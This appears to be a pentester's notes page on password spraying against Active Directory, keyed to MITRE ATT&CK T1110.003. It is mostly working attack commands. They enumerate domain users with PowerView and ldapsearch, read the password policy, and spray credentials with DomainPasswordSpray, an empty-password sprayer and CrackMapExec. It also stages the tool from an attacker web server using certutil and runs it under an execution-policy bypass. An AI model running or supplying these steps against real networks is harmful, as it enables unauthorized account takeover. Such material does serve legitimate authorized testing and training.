# Password Sprayng

**ATT\&CK ID:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)



**Password spraying** is an attack technique in which an adversary attempts to compromise user accounts by trying to authenticate with a curated list of passwords that are either frequently used or likely to be used by their target.

Task to need to perform password spraying:

* Task 1: Identify all the **users in the domain**
* Task 2: **Initiate** the Password Spraying Attack
* Task 3: **Execution and Verification** of the Password Spraying Attack



## Users Enumeration

### PowerView Import & Enum

Lets use PowerView ps1 module to enumerate all domain users.&#x20;

Copy the script below in a .ps1 file on Kali and transfer file with web server to target machine.

```bash
# kali machine
nano PowerView.ps1

python3 -m http.server 80
```

```powershell
# target machine
cd C:\Temp
certutil -urlcache -f http://$IP:80/PowerView.ps1 PowerView.ps1

powershell -ep bypass

# upload the ps1 script
. .\PowerView.ps1
```

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" %}

Run the PowerView command to domain users enumeration

```powershell
# run and save the output into a file 
Get-DomainUser | Select-Object -ExpandProperty cn | Out-File users.txt
type users.txt # to print the output file 
```

***

Another powershell comand to enum domain users:

```powershell
net user /domain
```

### ldapseach (from linux)

The following command makes a request to LDAP to return an output file with all users in the domain.

{% code overflow="wrap" %}
```bash
ldapsearch -H ldap://<DC_IP> -D "user@domain.com" -w <password> -b "dc=domain,dc=com" "(objectClass=user)" | grep "sAMAccountName: " | awk -F'sAMAccountName: ' '{print $2}' > users.txt
```
{% endcode %}





## Get Password Policy

If you have some user credentials or a shell as a domain user you can **get the password policy with**:

### From linux

```bash
# from kali
crackmapexec ldap $IP -u 'user' -p 'password' --pass-pol

ldapsearch -H ldap://10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### From windows

```powershell
# from Windows
net accounts

# from PowerView
Get-DomainPolicy
```

## Run Password Spray

### From Windows

#### DomainPasswordSpray.ps1

Copy this .ps1 script to a file on target machine and import it.

```powershell
cd \PATH\TO\DomainPasswordSpraying.ps1
. .\DomainPasswordSpraying.ps1
```

{% embed url="https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1" %}

Execute this command to do password spray

<pre class="language-powershell"><code class="lang-powershell"><strong>Invoke-DomainPasswordSpray -UserList .\users.txt -Password $PASS -Verbose
</strong></code></pre>

***

```powershell
Invoke-SprayEmptyPassword
```

{% embed url="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1" %}

### From Linux

#### CrackMapExec

```bash
crackmapexec smb $IP -u users.txt -p passwords.txt
```













